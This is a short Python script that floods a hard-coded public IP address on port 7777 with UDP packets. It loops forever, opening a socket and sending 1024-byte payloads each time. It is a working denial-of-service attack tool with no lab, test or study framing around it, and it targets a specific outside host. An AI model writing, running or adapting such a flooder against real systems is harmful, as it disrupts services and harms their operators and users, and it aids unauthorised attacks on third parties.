import socket

target_ip = "164.92.234.227"
target_port = 7777

def udp_flood(target_ip, target_port):
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"A"*1024, (target_ip, target_port))

udp_flood(target_ip, target_port)
